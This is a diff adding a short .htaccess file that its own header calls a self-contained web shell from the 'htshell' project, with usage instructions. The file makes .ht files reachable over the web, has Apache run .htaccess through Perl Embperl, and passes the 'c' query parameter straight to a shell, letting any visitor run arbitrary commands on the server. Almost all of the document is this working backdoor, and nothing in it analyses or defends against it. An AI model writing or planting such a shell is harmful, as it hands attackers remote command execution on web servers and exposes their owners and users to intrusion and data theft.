@@ -1,0 +1,15 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+# Run commands via http://url/.htaccess?c=cmd (ie: http://url/.htaccess?c=uname -a)
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+Options +ExecCGI
+AddHandler perl-script .htaccess
+PerlHandler Embperl
+
+# SHELL
+[+ `$fdat{c}` +]
